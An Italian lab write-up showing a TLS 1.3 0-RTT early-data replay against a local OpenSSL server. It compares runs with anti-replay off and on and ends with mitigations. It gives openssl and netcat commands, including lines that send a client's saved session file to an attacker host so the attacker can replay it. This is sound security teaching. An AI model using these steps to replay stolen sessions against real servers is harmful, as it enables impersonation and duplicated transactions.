# Early data attack

## Introduzione

Si basa sul mandare dati durante l'handshake sfruttando una sessione già esistente.
E' una feature esistente solo in TLS 1.3.

In pratica il client stabilisce una sessione con il server e salva tale sessione per comunicare in seguito senza dover ristabilire l'handshake completo da capo.
L'attacker può rubare tale sessione o sniffare la comunicazione e craftare i pacchetti in modo da rimandarli al server. Visto che l'handshake non è completo, l'attacker può quindi fingersi il client e mandare dati in early data mode che vengono quindi rilevati facente parti della sessione del client.
Infatti, di default non ha verifiche sugli indirizzi IP dei mittenti, quindi non distingue tra client e attacker.

Può essere mitigato disabilitando la funzionalità Early data, inserendo dei controlli manuali (lato codice) sul server per individuare ip sospetti o sessioni sospette, oppure attivare le protezioni anti replay attack.

Dal momento che l'unico tool ad alto livello in grado di dare libertà sulla configurazione dell'early data e dell'anti replay è OpenSSL 3.0.13 30 optiamo per questa soluzione.


## Operazioni preliminari

Generazione early data che verrà usato dal client:
```
printf 'EARLY-DATA: id=1\n' > early.txt
```
Il contenuto non è importante, è solo per mostrare dati da inviare.

Generazione certificato self-signed e chiave del server OpenSSL:
```
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=early-data"
```

Avviare wireshark lato attacker:
```
sudo wireshark
```
E impostare il filtro `tls` per filtrare solo i pacchetti TLS.


## Esperimenti

### Senza early data

Il primo esperimento è per mostrare il comportamento della comunicazione senza l'attivazione del supporto early data del server.

Avvio server senza la modalità di accettazione Early-data:
```
openssl s_server -accept <port> -cert server.crt -key server.key -tls1_3
```

Connessione del client e salvataggio sessione nel file 'sess.bin':
```
printf 'GET / HTTP/1.0\r\nHost: <ip_server>\r\n\r\n' | openssl s_client -connect <ip_server>:<port> -tls1_3 -sess_out sess.bin
```
Anche in questo caso non è importante cosa mandare al server, in questo esempio simuliamo di inviare una request HTTP al server usando il metodo GET. Non avendo configurato il server per svolgere alcuna azione HTTP, la request non produrrà alcun risultato.

Invio early data del client:
```
openssl s_client -connect <ip_server>:<port> -tls1_3 -sess_in sess.bin -early_data early.txt
```

#### Risultati

Dal log a schermo di OpenSSL del server possiamo vedere che non viene ricevuto alcun early data, questo è corretto in quanto non ne abbiamo abilitato l'accettazione sul server.
Da Wireshark invece notiamo che insieme al Client Hello non viene mandato alcun Application data, campo che invece sarebbe presente perché viene mandato prima del pacchetto Server Hello.


### Con early data ma senza protezione anti replay

In questo caso attiviamo l'early data mode sul server ma disattiviamo la modalità di protezione anti replay. 
Senza la protezione anti replay, il server non associerà alcun token alla sessione del client, consentendo quindi di ricevere l'early multiple volte da qualsiasi mittente.

Avvio server per accettare early data:
```
openssl s_server -accept <port> -cert server.crt -key server.key -tls1_3 -early_data -no_anti_replay
```

Handshake client e salvataggio sessione:
```
printf 'GET / HTTP/1.0\r\nHost: <ip_server>\r\n\r\n' | openssl s_client -connect <ip_server>:<port> -tls1_3 -sess_out sess.bin
```

A questo l'attacker può sfruttare la vulnerabilità in due modi:
- Sniffare il momento in cui il client invia l'early data e craftare il pacchetto in modo che il sequence number e altri elementi del pacchetto TCP rendino il pacchetto valido per il server TLS, infatti senza questi accorgimente verrebbe semplicemente rifiutato.
- Usare la sessione dell'utente, ipotizzando sia riuscito ad ottenerla grazie ad una fase precedente di attacco che il client ignora.

Il primo caso richiede di lavorare a basso livello per costruire in modo valido il pacchetto TCP ed essendo parecchio complicato e fuori dagli obiettivi principali del progetto, abbiamo deciso di considerare il secondo caso che, seppur una ipotesi forte, ci consente di mostrare i risultati della vulnerabilità in modo più immediato.

Invio early data del client:
```
openssl s_client -connect <ip_server>:<port> -tls1_3 -sess_in sess.bin -early_data early.txt
```

Per simulare la ricezione della sessione instauriamo una connessione rapida con netcat tra attacker (in ascolto) e client (come mittente ignaro), ma qualsiasi altro approccio di condivisione dei file va bene. Inoltre, per quanto non essenziale ipotizziamo anche di usare gli stessi early data del client.

Attacker in ascolto su netcat:
```
nc -l -p 4444 -q 1 > sess.bin
nc -l -p 4445 -q 1 > early.txt
```
Le porte utilizzate sono arbitrarie e sono usate solo per ricevere i file.

Invio dei file da parte del client:
```
nc <ip_attacker> 4444 < sess.bin
nc <ip_attacker> 4445 < early.txt
```

L'attacker può quindi sfruttare la sessione già esistente del client per connettersi al server TLS senza handshake completo e mandare dati spacciandosi per il client.
Non è essenziale dover mandare gli stessi dati del client, dipende dagli obiettivi dell'attacker, per esempio il server potrebbe riusare gli stessi dati per effettuare molteplici spese, ma non è vincolato dal poter mandare altri dati se consentito dal server.

Attacker può mandare lo stesso early data con la stessa sessione del client multiple volte:
```
openssl s_client -connect <ip_server>:<port> -tls1_3 -sess_in sess.bin -early_data early.txt
```
Ripetere per vedere che il server non rifiuta il messaggio.

#### Risultati

Dal log di OpenSSL possiamo notare che compare la voce 'Early data received' insieme ai dati mandati dal client e dall'attacker.
Inoltre mandare molteplici volte l'early data, sia che sia il client o l'attacker, non comporta rifiuti da parte del server.
Su wireshark invece possiamo osservare che insieme al Client Hello viene mandato il pacchetto di Application Data dove al suo interno è presente l'early data criptato.


### Con early data e con protezione anti replay

In questo caso insieme alla possibilità di riceve early data, attiviamo pure la protezione anti replay.

Avvio server per accettare early data:
```
openssl s_server -accept <port> -cert server.crt -key server.key -tls1_3 -early_data
```

Handshake client e salvataggio sessione:
```
printf 'GET / HTTP/1.0\r\nHost: <ip_server>\r\n\r\n' | openssl s_client -connect <ip_server>:<port> -tls1_3 -sess_out sess.bin
```

Anche in questo caso ci poniamo sotto le stesse ipotesi del caso precedente, quindi l'attacker ottiene la sessione e i dati da inviare in early data.

Invio early data del client:
```
openssl s_client -connect <ip_server>:<port> -tls1_3 -sess_in sess.bin -early_data early.txt
```

Per l'attacker in ascolto:
```
nc -l -p 4444 -q 1 > sess.bin
nc -l -p 4445 -q 1 > early.txt
```

Per il client in trasmissione:
```
nc <ip_attacker> 4444 < sess.bin
nc <ip_attacker> 4445 < early.txt
```

L'attacker può adesso usare la stessa sessione del client per mandare l'early data al server:
```
openssl s_client -connect <ip_server>:<port> -tls1_3 -sess_in sess.bin -early_data early.txt
```

#### Risultati

In questo caso possiamo provare a mandare l'early data molteplici volte sia da parte del client che da parte dell'attacker, e possiamo di conseguenza osservare che il server accetterà solo il primo early data ricevuto, mentre tutti quelli successivi verranno rifiutato.
Possiamo osservare il rifiuto nel log del server OpenSSL.
Su wireshark possiamo invece notare che il client manda ancora l'early data insieme al Client Hello, questo perché è il server a rifiutarlo grazie a verifiche interne che segnalano scaduta la possibilità di inviare early data con quella stessa sessione. In questo caso quindi non è possibile in alcun modo per l'attacker sfruttare la vulnerabilità.

---

## Note

Replay dei pacchetti catturati: l'attacker può iniettare i pacchetti cifrati senza avere la sessione, ma questo funziona solo se riesce a reinserire i pacchetti nella stessa connessione TCP, quindi modificando i numeri di sequenza, gli ACK, gli IP e i MAC corretti, oppure riesce a sincronizzarsi con lo spoofing.
In questo caso non devono ovviamente esserci meccanismi di anti-replay da parte del server o non ha implementato controlli sui duplicati (esempio assegnando manualmente dei token o controllando il numero di request dallo stesso mittente che usa l'early data).
Realizzare uno stato del genere è molto complesso in quanto richiede di lavorare a basso livello.
Questa tecnica è chiamata sniff and re-inject.

Nel secondo caso, l'attaccante, se possiede la sessione (sess.bin), non ha bisogno di catturare e iniettare pacchetti. Può aprire una nuova connessione TLS usando la stessa sessione. Realizzare questo stato è più semplice e affidabile, soprattutto visto che l'obiettivo è mostrare la vulnerabilità.
Questa tecnica è detta session reuse.

Inoltre la comunicazione tra client e server è criptata con le chiavi TLS possedute all'interno della sessione salvata. Quindi qualsiasi early data inviato dall'attacker sarà cifrato con le stesse chiavi.
Il server non sa chi sia il client originario, tutto ciò che fa è decifrare i pacchetti usando la sessione e accettare il conenuto se l'anti-replay è disabilitato.
TLS non protegge l'IP, quindi anche se al server arrivano IP diversi con la stessa sessione, non lo bloccherà a patto che il server stesso non implementi meccanismi di controllo.

Con la sessione salvata, il client può riaprire la sessione senza rifare l'handshake completo.
Quindi l'attacker può aprire una nuova connessione TLS senza fare l'handshake completo, usare le stesse chiavi simmetriche del client e inviare l'early data cifrato correttamente sapendo che il server lo accetterà se l'anti-replay è disabilitato.
NB: la sessione salvata non elimina del tutto l'handshake: vengono inviate con un ClientHello (session resumption) le PSK (pre shared key) dalla sessione selvata. Il server già conosce queste chiavi perché le ricava dalla sessione.

TLS 1.3 consente di usare 0-RTT data, cioè inviare dati durante l'handshake, senza aspettare il completamento della connessione. Utile per ridurre latenza o per client che si riconnettono spesso.
I dati in 0-RTT sono vulnerabili a replay attacks, cioè possono essere intercettati e rinviati per indurre il server a eseguire più volte la stessa operazione.
Questo avviene perché i dati 0-RTT non hanno garanzia di freshness e non hanno protezioni di forward secrecy.

Mitigazioni: 
limitare 0-RTT solo a richieste idempotenti come GET.
I server possono rifiutare i dati 0-RTT.
Implementare anti-replay machanism lato server (token, timestamp e controlli di sessione).
Disabilitare 0-RTT.

Il Client invia l'Early data nel pacchetto Application data che è incorporato all'interno del pacchetto Client Hello, quindi manda tutto insieme.


